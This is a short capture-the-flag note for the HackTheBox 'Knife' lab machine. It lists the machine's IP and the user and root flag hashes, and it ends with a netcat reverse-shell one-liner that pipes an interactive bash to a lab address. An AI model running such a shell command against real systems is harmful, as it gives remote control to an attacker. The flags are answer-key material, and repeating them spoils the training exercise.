# HackTheBox Knife

> Saikat Karmakar | AUG 31 : 2021

> ip: 10.10.10.242

---


1. user.txt
```
cb8f9c061388738452e6a47a1e6709cb
```

2. root.txt
```
15cf96af67fd1f5b779e726db6140dc3
```


rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.12 1234 >/tmp/f